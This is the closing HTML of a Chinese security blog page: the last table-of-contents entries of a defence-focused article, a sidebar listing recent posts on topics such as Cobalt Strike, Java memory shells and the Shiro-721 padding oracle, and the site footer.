href="#1-%E7%BC%96%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1"><span class="toc-text">1. 编码层防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%9D%83%E9%99%90%E9%98%B2%E6%8A%A4"><span class="toc-text">2. 配置与权限防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%90%E8%A1%8C%E6%97%B6%E4%B8%8E%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8B"><span class="toc-text">3. 运行时与日志检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B8%B8%E7%94%A8%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90"><span class="toc-text">4. 常用检测工具推荐</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/21/Java%E5%8F%8D%E5%B0%84%EF%BC%88Reflection%EF%BC%89/" title="无题"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2026/01/21/Java%E5%8F%8D%E5%B0%84%EF%BC%88Reflection%EF%BC%89/" title="无题">无题</a><time datetime="2026-01-21T15:17:31.770Z" title="发表于 2026-01-21 23:17:31">2026-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/30/Cobalt%20Strike%20C2%E4%BD%93%E7%B3%BB%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/" title="Cobalt Strike C2体系深度解析"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike C2体系深度解析"/></a><div class="content"><a class="title" href="/2025/05/30/Cobalt%20Strike%20C2%E4%BD%93%E7%B3%BB%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/" title="Cobalt Strike C2体系深度解析">Cobalt Strike C2体系深度解析</a><time datetime="2025-05-30T08:36:14.000Z" title="发表于 2025-05-30 16:36:14">2025-05-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/30/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java内存马"/></a><div class="content"><a class="title" href="/2025/05/30/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">Java内存马</a><time datetime="2025-05-30T08:36:14.000Z" title="发表于 2025-05-30 16:36:14">2025-05-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/30/SQL%20Server%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%8C%E6%95%B4%E5%B7%A5%E5%85%B7%E9%93%BE%E6%89%8B%E5%86%8C/" title="SQL Server渗透测试"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL Server渗透测试"/></a><div class="content"><a class="title" href="/2025/05/30/SQL%20Server%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%8C%E6%95%B4%E5%B7%A5%E5%85%B7%E9%93%BE%E6%89%8B%E5%86%8C/" title="SQL Server渗透测试">SQL Server渗透测试</a><time datetime="2025-05-30T08:36:14.000Z" title="发表于 2025-05-30 16:36:14">2025-05-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/30/Shiro-721%20Padding%20Oracle%E6%94%BB%E5%87%BB%E5%AE%8C%E6%95%B4%E7%AC%94%E8%AE%B0/" title="Shiro-721 Padding Oracle攻击完整笔记"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro-721 Padding Oracle攻击完整笔记"/></a><div class="content"><a class="title" href="/2025/05/30/Shiro-721%20Padding%20Oracle%E6%94%BB%E5%87%BB%E5%AE%8C%E6%95%B4%E7%AC%94%E8%AE%B0/" title="Shiro-721 Padding Oracle攻击完整笔记">Shiro-721 Padding Oracle攻击完整笔记</a><time datetime="2025-05-30T08:36:14.000Z" title="发表于 2025-05-30 16:36:14">2025-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By Rui Ji</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
